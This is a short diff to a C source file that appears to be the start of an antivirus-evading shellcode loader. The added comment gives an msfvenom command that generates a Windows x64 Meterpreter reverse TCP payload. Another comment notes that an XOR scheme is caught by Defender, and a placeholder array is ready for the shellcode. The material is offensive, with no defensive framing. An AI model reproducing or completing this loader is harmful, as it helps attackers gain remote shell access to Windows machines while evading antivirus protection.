@@ -1,5 +1,6 @@
 #include <stdio.h>
 
+// msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ip LPORT=443 -f c -o shellcode.bin
 // this implementation of xor is catchable by defender AV
 unsigned char tryme[] = SHELLCODEGOESHERE;
 
